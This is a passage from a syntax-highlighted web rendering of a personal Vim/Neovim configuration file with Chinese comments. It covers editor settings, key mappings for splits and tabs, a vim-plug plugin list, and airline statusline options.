class="keyword">sync</span> | <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 保存vimrc时立即重新加载生效</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWritePost $MYVIMRC <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;基础配置</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 文件类型检测</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 开启语法高亮</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&quot;g:syntax_on&quot;</span>)</span><br><span class="line">    <span class="keyword">syntax</span> enable</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; txt文件按照wiki语法高亮</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"><span class="keyword">autocmd</span> BufEnter *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 恢复上次文件打开位置</span></span><br><span class="line"><span class="keyword">au</span> BufReadPost * <span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; <span class="number">0</span>|<span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= <span class="built_in">line</span>(<span class="string">&quot;$&quot;</span>)|<span class="keyword">exe</span>(<span class="string">&quot;norm &#x27;\&quot;&quot;</span>)|<span class="keyword">else</span>|<span class="keyword">exe</span> <span class="string">&quot;norm $&quot;</span>|<span class="keyword">endif</span>|<span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开是运行指令 取消上回搜索内容的高亮</span></span><br><span class="line">exec <span class="string">&quot;nohlsearch&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;Let</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mapleader=<span class="string">&quot; &quot;</span>	<span class="comment">&quot; 将leader键（\键,类似于Windows键）换成空格（相当于空格键）</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_ut=<span class="string">&#x27;&#x27;</span>		<span class="comment">&quot; 矫正部分配色</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 不同模式下的光标样式</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=1\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SR = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=2\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_EI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=0\x7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; python解释器</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;let g:python_host_prog=&#x27;/usr/bin/python2&#x27;</span></span><br><span class="line"><span class="comment">&quot;let g:python3_host_prog=&#x27;/usr/bin/python3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;let</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;set</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"><span class="keyword">set</span> nocompatible	<span class="comment">&quot; 不兼容 VI ,compatible为兼容(tab将不会变成空格)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fileencodings=utf-<span class="number">8</span>,gbk	<span class="comment">&quot; 写入文件时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> termencoding=utf-<span class="number">8</span>		<span class="comment">&quot; 输出到终端时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span>	<span class="comment">&quot; 缓存的文本、寄存器、Vim 脚本文件等</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>			<span class="comment">&quot; 显示行号	缩写： nu</span></span><br><span class="line"><span class="keyword">set</span> relativenumber	<span class="comment">&quot; 从当前行向前向后算行数</span></span><br><span class="line"><span class="keyword">set</span> cursorline		<span class="comment">&quot; 突出显示当前行	缩写： cul</span></span><br><span class="line"><span class="string">&quot;set cursorcolumn	&quot;</span> 突出显示当前列	缩写： cuc</span><br><span class="line"><span class="keyword">set</span> showmatch		<span class="comment">&quot; 显示括号匹配</span></span><br><span class="line"><span class="keyword">set</span> showcmd			<span class="comment">&quot; 显示指令</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>	<span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler			<span class="comment">&quot; 显示光标当前位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wrap			<span class="comment">&quot; 自动换行</span></span><br><span class="line"><span class="keyword">set</span> tw=<span class="number">0</span>			<span class="comment">&quot; 防止自动分割行</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;set expandtab		&quot;</span> 自动将制表符换成空格</span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>		<span class="comment">&quot; 制表符长度为4空格	缩写：ts</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>	<span class="comment">&quot; 自动缩进长度为4空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent		<span class="comment">&quot; 自动缩进</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">cindent</span>			<span class="comment">&quot; c格式自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent		<span class="comment">&quot; 遇右花括号 &#125; 取消缩进的自动缩进</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wildmenu		<span class="comment">&quot; 命令补全</span></span><br><span class="line"><span class="keyword">set</span> autochdir       <span class="comment">&quot; 在当前目录下执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> hlsearch		<span class="comment">&quot; 高亮显示搜索</span></span><br><span class="line"><span class="keyword">set</span> incsearch		<span class="string">&quot; 动态高亮搜索&quot;</span></span><br><span class="line"><span class="keyword">set</span> ignorecase		<span class="comment">&quot; 不区分大小写搜索</span></span><br><span class="line"><span class="keyword">set</span> smartcase		<span class="comment">&quot; 智能大小写搜索</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span>			<span class="comment">&quot; 使用鼠标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start	<span class="comment">&quot; 能退格到行尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;set</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;键盘映射</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map 递归映射</span></span><br><span class="line"><span class="comment">&quot; map a b</span></span><br><span class="line"><span class="comment">&quot; map b c</span></span><br><span class="line"><span class="comment">&quot; a映射为c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; nmap 普通模式下的递归映射&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; noremap 不递归映射</span></span><br><span class="line"><span class="comment">&quot; noremap a b</span></span><br><span class="line"><span class="comment">&quot; noremap b c</span></span><br><span class="line"><span class="comment">&quot; a映射为b b映射为c 两个映射互不影响</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; unmap 取消 map 的映射</span></span><br><span class="line"><span class="comment">&quot; mapclear 取消所有 map 的映射</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;noremap a b	&quot;</span> 将 <span class="keyword">a</span> 映射为 <span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap A 5b	&quot;</span> 将 A 映射为 <span class="number">5</span><span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap = nzz	&quot;</span> 将 n 映射 =zz 	<span class="comment">&quot; 用 zz 将该行变成中心点</span></span><br><span class="line"><span class="string">&quot;noremap - Nzz	&quot;</span> 将 <span class="keyword">N</span> 映射 -zz</span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span><span class="symbol">&lt;CR&gt;</span> :<span class="keyword">nohlsearch</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 &lt;LEADER&gt;&lt;CR&gt; 映射为 :nohlsearch&lt;CR&gt; 用于快捷取消搜索高亮</span></span><br><span class="line"><span class="keyword">noremap</span> J <span class="number">5</span><span class="keyword">j</span></span><br><span class="line"><span class="keyword">noremap</span> K <span class="number">5</span><span class="keyword">k</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 复制到系统剪切板</span></span><br><span class="line"><span class="string">&quot;vnoremap Y :w !xclip -i -sel c&lt;CR&gt;	&quot;</span> 需要安装xclip  #sudo pacman -S xclip</span><br><span class="line"><span class="keyword">vnoremap</span> Y <span class="string">&quot;+y		&quot;</span> 需要安装<span class="keyword">gvim</span>   #sudo pacman -S <span class="keyword">gvim</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开vimrc文件</span></span><br><span class="line"><span class="keyword">map</span> MR :<span class="keyword">e</span> $MYVIMRC<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> s <span class="symbol">&lt;nop&gt;</span></span><br><span class="line"><span class="keyword">map</span> S :<span class="keyword">w</span><span class="symbol">&lt;CR&gt;</span>	<span class="string">&quot; 将 S 的指令映射为 :w&lt;CR&gt; 	 &quot;</span> <span class="symbol">&lt;CR&gt;</span> 代表回车</span><br><span class="line"><span class="keyword">map</span> Q :q<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 Q 的指令映射为 :q&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;C-a&gt;</span> ggvG 	<span class="comment">&quot; Ctrl-A 选中所有内容</span></span><br><span class="line"><span class="string">&quot;map R :source $MYVIMRC&lt;CR&gt;		&quot;</span> 将 R 的指令映射成 重载vimrc配置</span><br><span class="line"><span class="comment">&quot; 打开新文件</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>s :<span class="keyword">e</span><span class="symbol">&lt;Space&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sk :<span class="keyword">set</span> splitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="string">&quot; 下分屏&quot;</span>:<span class="keyword">e</span> /文件路径 打开文件</span><br><span class="line"><span class="keyword">map</span> sj :<span class="keyword">set</span> nosplitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 上分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sl</span> :<span class="keyword">set</span> nosplitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 右分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sh</span> :<span class="keyword">set</span> splitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 左分屏	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sz <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>H 	<span class="comment">&quot; 竖向分屏换左右分屏</span></span><br><span class="line"><span class="keyword">map</span> ss <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>K		<span class="comment">&quot; 左右分屏换竖向分屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">k</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">k</span>	<span class="comment">&quot; 光标到上屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">j</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">j</span>	<span class="comment">&quot; 光标到下屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">l</span>	<span class="comment">&quot; 光标到右屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>h <span class="symbol">&lt;C-w&gt;</span>h	<span class="comment">&quot; 光标到左屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;up&gt;</span> :<span class="keyword">res</span> +<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线上移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;down&gt;</span> :<span class="keyword">res</span> -<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线下移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;left&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>+<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线左移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;right&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>-<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线右移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tn</span> :<span class="keyword">tabe</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; ta打开新选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">th</span> :-<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到左边的选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tl</span> :+<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到右边的选项卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;键盘映射</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;基础配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件安装</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 安装plug：</span></span><br><span class="line"><span class="comment">&quot; curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.config/nvim/plugged&#x27;</span>)  <span class="comment">&quot; 启用plug安装</span></span><br><span class="line"><span class="comment">&quot; 插件github项目地址为：https://github.com/ 加 &#x27;&#x27; 中的内容</span></span><br><span class="line"><span class="comment">&quot; 如：https://github.com/vim-airline/vim-airline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===状态栏===</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span>	<span class="comment">&quot; 状态栏</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span>	<span class="comment">&quot; 状态栏主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===配色方案===</span></span><br><span class="line">Plug <span class="string">&#x27;lifepillar/vim-solarized8&#x27;</span>		<span class="comment">&quot; solarized8主题</span></span><br><span class="line">Plug <span class="string">&#x27;ayu-theme/ayu-vim&#x27;</span>				<span class="comment">&quot; ayu主题</span></span><br><span class="line">Plug <span class="string">&#x27;nathanaelkane/vim-indent-guides&#x27;</span>	<span class="comment">&quot; 显示缩进级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===目录树===</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdtree&#x27;</span>				<span class="comment">&quot; 目录树，方便浏览当前目录下的文件</span></span><br><span class="line">Plug <span class="string">&#x27;Xuyuanp/nerdtree-git-plugin&#x27;</span>      <span class="comment">&quot; 目录树git提示</span></span><br><span class="line">Plug <span class="string">&#x27;kien/ctrlp.vim&#x27;</span>					<span class="comment">&quot; 适用于大规模项目文件的浏览</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===自动化===</span></span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;		<span class="comment">&quot; 代码补全 需要vim &gt;=8 或neovim</span></span><br><span class="line">Plug <span class="string">&#x27;vim-syntastic/syntastic&#x27;</span>				<span class="comment">&quot; 错误语法提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===历史===</span></span><br><span class="line">Plug <span class="string">&#x27;mbbill/undotree&#x27;</span>					<span class="comment">&quot; 历史修改撤回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===文本===</span></span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span>				<span class="comment">&quot; 文本过滤、对齐工具</span></span><br><span class="line">Plug <span class="string">&#x27;gcmt/wildfire.vim&#x27;</span>				<span class="comment">&quot; 视图模式下快速选中符号中的内容</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdcommenter&#x27;</span>			<span class="comment">&quot; 快速注释一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; === JSON, CSS, PHP, JavaScript, HTML, etc.===</span></span><br><span class="line">Plug <span class="string">&#x27;elzr/vim-json&#x27;</span>  <span class="comment">&quot; JSON关键字与值的突出显示，特定于JSON（非JS）的警告，引号隐藏</span></span><br><span class="line">Plug <span class="string">&#x27;hail2u/vim-css3-syntax&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; CSS3语法支持</span></span><br><span class="line">Plug <span class="string">&#x27;spf13/PIV&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; PHP集成环境</span></span><br><span class="line">Plug <span class="string">&#x27;pangloss/vim-javascript&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; Javascript缩进和语法支持</span></span><br><span class="line">Plug <span class="string">&#x27;yuezk/vim-js&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot;JavaScript和Flow.js的最准确的语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;MaxMEllon/vim-jsx-pretty&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; JSX 和 TSX 语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;jelera/vim-javascript-syntax&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; 增强JavaScript语法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Go===</span></span><br><span class="line">Plug <span class="string">&#x27;fatih/vim-go&#x27;</span> , &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;go&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>], <span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;*&#x27;</span> &#125;  <span class="comment">&quot; Go开发插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Python===</span></span><br><span class="line">Plug <span class="string">&#x27;tmhedberg/SimpylFold&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python代码折叠</span></span><br><span class="line">Plug <span class="string">&#x27;Vimjas/vim-python-pep8-indent&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python缩进</span></span><br><span class="line">Plug <span class="string">&#x27;numirias/semshi&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;:UpdateRemotePlugins&#x27;</span>, <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;tweekmonster/braceless.vim&#x27;</span>  <span class="comment">&quot;用于Python和其他缩进语言的文本对象折叠</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Markdon===</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: &#123; -&gt; mkdp#util#install() &#125;, <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;markdown&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>]&#125;  <span class="comment">&quot; markdowm预览</span></span><br><span class="line">Plug <span class="string">&#x27;dhruvasagar/vim-table-mode&#x27;</span>, &#123; <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;TableModeToggle&#x27;</span> &#125;	<span class="comment">&quot; 表格制作工具</span></span><br><span class="line">Plug <span class="string">&#x27;mzlogin/vim-markdown-toc&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;gitignore&#x27;</span>, <span class="string">&#x27;markdown&#x27;</span>] &#125;  <span class="comment">&quot; 目录生成</span></span><br><span class="line">Plug <span class="string">&#x27;theniceboy/bullets.vim&#x27;</span>  <span class="comment">&quot; 自动添加项目列表符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Git===</span></span><br><span class="line">Plug <span class="string">&#x27;theniceboy/vim-gitignore&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;gitignore&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; 为.gitignore文件提供语法高亮显示和最新代码片段</span></span><br><span class="line">Plug <span class="string">&#x27;fszymanski/fzf-gitignore&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;:UpdateRemotePlugins&#x27;</span> &#125;  <span class="comment">&quot; fzf接口，用于使用gitignore.io API创建.gitignore文件</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;mhinz/vim-signify&#x27;  &quot;</span>使用Vim的符号列显示差异</span><br><span class="line">Plug <span class="string">&#x27;airblade/vim-gitgutter&#x27;</span>  <span class="comment">&quot; 显示git diff。 它显示了已添加，修改或删除的行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===编辑增强===</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span>  <span class="comment">&quot; 符号补全</span></span><br><span class="line">Plug <span class="string">&#x27;mg979/vim-visual-multi&#x27;</span>  <span class="comment">&quot; 多光标支持</span></span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-surround&#x27;</span>  <span class="comment">&quot; 符号环境，轻松对符号内的内容进行修改</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/vim-after-object&#x27;</span> <span class="comment">&quot; 指定内容操作 ，da=  删除=后的内容</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/vim-easy-align&#x27;</span> <span class="comment">&quot; 对齐插件 ， gaip=  使段落仲的 = 对齐</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===其他===</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;yianwillis/vimcdoc&#x27;  &quot;</span> <span class="keyword">vim</span>中文帮助</span><br><span class="line"><span class="string">&quot;Plug &#x27;liuchengxu/vim-which-key&#x27;  &quot;</span> 显示被绑定的可用按键</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==依赖==</span></span><br><span class="line">Plug <span class="string">&#x27;MarcWeber/vim-addon-mw-utils&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;kana/vim-textobj-user&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;fadein/vim-FIGlet&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#end()		<span class="comment">&quot;结束plug安装</span></span><br><span class="line"><span class="comment">&quot; 刷新vimrc后使用 :PlugInstall 安装插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件安装</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件配置</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===状态栏===</span></span><br><span class="line"><span class="comment">&quot; ==airline状态栏==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#enabled = <span class="number">1</span>	<span class="comment">&quot; airline 显示选项卡和缓冲区</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_theme</span>=<span class="string">&#x27;jellybeans&#x27;</span></span><br><span class="line"><span class="comment">&quot; 状态栏分隔美化  需要安装powerline-fonts字体（https://github.com/powerline/fonts） #sudo pacman -S powerline-fonts</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&#x27;g:airline_symbols&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">g:airline_symbols</span> = &#123;&#125;</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.branch = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.readonly = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.linenr = <span class="string">&#x27;☰&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.maxlinenr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.dirty= <span class="string">&#x27;⚡&#x27;</span></span><br><span class="line"></span><br><span class="line"><span 